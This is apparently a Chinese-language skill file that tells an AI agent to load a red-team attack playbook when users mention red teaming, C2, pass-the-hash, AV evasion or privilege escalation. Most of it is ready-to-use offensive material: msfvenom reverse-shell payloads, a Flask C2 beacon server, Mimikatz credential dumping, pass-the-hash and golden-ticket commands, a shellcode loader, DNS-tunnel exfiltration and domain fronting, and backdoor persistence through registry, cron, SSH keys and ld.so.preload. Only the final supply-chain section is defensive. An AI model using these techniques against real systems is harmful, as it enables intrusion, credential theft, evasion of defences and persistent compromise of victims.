---
name: red-team
description: 紅隊攻擊技術。PoC開發、C2框架、橫向移動、許可權提升、免殺技術。當使用者提到紅隊、PoC、C2、橫向移動、PTH、免殺、Cobalt Strike、Sliver、提權時使用。
---

# 🔥 赤焰秘典 · 紅隊攻擊 (Red Team)


## 攻擊鏈 (Kill Chain)

```
偵察 → 武器化 → 投遞 → 利用 → 安裝 → C2 → 行動
  │        │       │      │       │      │      │
  └─ OSINT ─┴─ PoC ─┴─ 釣魚 ─┴─ 提權 ─┴─ 持久 ─┴─ 橫向
```

## PoC 開發

### 標準 PoC 結構
```python
#!/usr/bin/env python3
"""
漏洞名稱: CVE-XXXX-XXXX
影響版本: x.x.x - x.x.x
漏洞型別: RCE/SQLi/XSS/SSRF
"""
import requests
import argparse

class POC:
    def __init__(self, target: str):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        }

    def check(self) -> bool:
        """無害檢測"""
        try:
            # 使用延時、DNS外帶等無害方式驗證
            pass
        except Exception as e:
            return False

    def exploit(self, cmd: str) -> str:
        """漏洞利用"""
        pass

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True)
    parser.add_argument('-c', '--cmd', default='id')
    args = parser.parse_args()

    poc = POC(args.url)
    if poc.check():
        print(f"[+] Vulnerable!")
        print(poc.exploit(args.cmd))
    else:
        print("[-] Not vulnerable")

if __name__ == '__main__':
    main()
```

## C2 框架

### Sliver (推薦開源)
```bash
# 安裝
curl https://sliver.sh/install | sudo bash

# 生成 Implant
sliver > generate --mtls 192.168.1.100 --os windows --save implant.exe
sliver > generate --http 192.168.1.100 --os linux --save implant

# 啟動監聽
sliver > mtls --lhost 0.0.0.0 --lport 8888
sliver > http --lhost 0.0.0.0 --lport 80

# 會話操作
sliver > sessions
sliver > use SESSION_ID
sliver (SESSION) > shell
sliver (SESSION) > download /etc/passwd
sliver (SESSION) > upload local remote
```

### Metasploit
```bash
# 生成 Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe

# 監聽
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 0.0.0.0
msf6 > run

# Meterpreter
meterpreter > getsystem
meterpreter > hashdump
meterpreter > load kiwi
meterpreter > creds_all
```

### 簡易 HTTP C2
```python
# Server
from flask import Flask, request, jsonify
import base64

app = Flask(__name__)
agents, tasks = {}, {}

@app.route('/beacon/<agent_id>')
def beacon(agent_id):
    if tasks.get(agent_id):
        return jsonify({"task": tasks[agent_id].pop(0)})
    return jsonify({"task": None})

@app.route('/result/<agent_id>', methods=['POST'])
def result(agent_id):
    output = base64.b64decode(request.json['output']).decode()
    print(f"[{agent_id}] {output}")
    return jsonify({"status": "ok"})
```

## 橫向移動

### Pass-the-Hash (PTH)
```bash
# Impacket
psexec.py -hashes :NTLM_HASH administrator@TARGET
wmiexec.py -hashes :NTLM_HASH administrator@TARGET
smbexec.py -hashes :NTLM_HASH administrator@TARGET

# CrackMapExec
crackmapexec smb TARGET -u admin -H HASH -x "whoami"
crackmapexec smb 192.168.1.0/24 -u admin -H HASH --shares

# Mimikatz
sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:cmd.exe
```

### Pass-the-Ticket (PTT)
```bash
# 匯出票據
mimikatz # sekurlsa::tickets /export

# 注入票據
mimikatz # kerberos::ptt ticket.kirbi

# Rubeus
Rubeus.exe ptt /ticket:ticket.kirbi
```

### Kerberos 攻擊
```bash
# Kerberoasting
GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request

# AS-REP Roasting
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP

# Golden Ticket
mimikatz # kerberos::golden /user:admin /domain:DOMAIN /sid:S-1-5-21-xxx /krbtgt:HASH /ptt
```

### 遠端執行方法
```bash
# WinRM
evil-winrm -i TARGET -u user -H HASH

# PowerShell Remoting
Enter-PSSession -ComputerName TARGET -Credential DOMAIN\user
Invoke-Command -ComputerName TARGET -ScriptBlock {whoami}

# WMI
wmic /node:TARGET /user:admin /password:pass process call create "cmd.exe /c whoami"
```

## 許可權提升

### Windows 提權
```powershell
# 資訊收集
whoami /priv
systeminfo
net user
net localgroup administrators

# 常見提權路徑
- SeImpersonatePrivilege → Potato系列
- 服務配置錯誤 → 服務路徑劫持
- 計劃任務 → 任務劫持
- AlwaysInstallElevated → MSI提權
- 未打補丁 → 核心漏洞

# Potato 提權
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t *
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami"
```

### Linux 提權
```bash
# 資訊收集
id
uname -a
cat /etc/passwd
sudo -l
find / -perm -4000 2>/dev/null

# 常見提權路徑
- SUID 二進位制 → GTFOBins
- sudo 配置錯誤 → sudo提權
- 核心漏洞 → DirtyPipe/DirtyCow
- 定時任務 → cron劫持
- 容器逃逸 → Docker/K8s

# SUID 利用
find / -perm -4000 2>/dev/null
# 查 GTFOBins: https://gtfobins.github.io/
```

## 免殺技術

### 基礎免殺
```python
# 1. 字串混淆
import base64
payload = base64.b64encode(b"malicious_code").decode()
exec(base64.b64decode(payload))

# 2. 動態載入
import importlib
module = importlib.import_module("os")
getattr(module, "system")("whoami")

# 3. 加密 Payload
from Crypto.Cipher import AES
# 執行時解密執行
```

### Shellcode 載入
```python
import ctypes

shellcode = b"\xfc\x48\x83..."  # msfvenom 生成

# Windows
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ptr, shellcode, len(shellcode))
ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
```

### 隱蔽通訊
```python
# DNS 隧道
def dns_exfil(data, domain):
    encoded = base64.b32encode(data.encode()).decode()
    for chunk in [encoded[i:i+63] for i in range(0, len(encoded), 63)]:
        dns.resolver.resolve(f"{chunk}.{domain}", 'A')

# 域前置
def domain_fronting(real_host, cdn_domain, data):
    headers = {"Host": real_host}
    requests.post(f"https://{cdn_domain}/api", json=data, headers=headers)
```

## 持久化

### Windows
```powershell
# 登錄檔
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\backdoor.exe"

# 計劃任務
schtasks /create /tn "Update" /tr "C:\backdoor.exe" /sc onlogon

# 服務
sc create backdoor binPath= "C:\backdoor.exe" start= auto

# WMI 事件訂閱
# 程序啟動時觸發
```

### Linux
```bash
# Crontab
echo "* * * * * /tmp/backdoor" >> /var/spool/cron/root

# SSH 金鑰
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# 服務
# 建立 systemd service

# LD_PRELOAD
echo "/tmp/evil.so" >> /etc/ld.so.preload
```

## 工具清單

| 工具 | 用途 |
|------|------|
| Sliver | 開源 C2 框架 |
| Metasploit | 滲透測試框架 |
| Cobalt Strike | 商業 C2 |
| Impacket | Windows 協議工具 |
| CrackMapExec | 批次橫向 |
| Mimikatz | 憑證提取 |
| Rubeus | Kerberos 工具 |
| BloodHound | AD 路徑分析 |

## 供應鏈安全

### 供應鏈攻擊向量
```
原始碼 → 構建 → 製品 → 分發 → 部署 → 執行
   │       │      │      │      │      │
   投毒    篡改   後門   劫持   提權   橫向
```

| 階段 | 攻擊方式 | 示例 |
|------|----------|------|
| 原始碼 | 依賴投毒 | event-stream、ua-parser-js |
| 構建 | CI/CD 劫持 | SolarWinds、CodeCov |
| 製品 | 惡意包 | PyPI/npm 釣魚包 |
| 部署 | 配置篡改 | K8s YAML 注入 |
| 執行 | 容器逃逸 | 特權容器、核心漏洞 |

### SBOM + 依賴掃描
```bash
# SBOM 生成 (Syft)
syft nginx:latest -o cyclonedx-json > sbom.json

# 漏洞掃描 (Trivy)
trivy image --severity HIGH,CRITICAL nginx:latest
trivy fs --scanners vuln,secret,misconfig .

# 依賴掃描 (Grype)
grype sbom:./sbom.json
```

### 簽名驗證 (Sigstore/Cosign)
```bash
cosign sign --key cosign.key myregistry/myapp:v1.0
cosign verify --key cosign.pub myregistry/myapp:v1.0
cosign attach sbom --sbom sbom.json myregistry/myapp:v1.0
cosign verify-attestation --key cosign.pub myregistry/myapp:v1.0
```

### SLSA 等級
```
Level 1: 文件化構建  Level 2: 防篡改+簽名來源
Level 3: 安全平臺+隔離構建  Level 4: 雙方審查+密封構建
```

### 供應鏈安全檢查清單
```yaml
原始碼:
  - [ ] 分支保護 + 程式碼審查 + 依賴鎖定 + 金鑰洩露掃描
構建與製品:
  - [ ] 託管CI/CD + 隔離構建 + 生成SBOM + 簽名製品 + 漏洞掃描
部署與執行:
  - [ ] 驗證簽名(Cosign/SLSA) + 准入控制(Kyverno/OPA) + 執行時監控
```

---

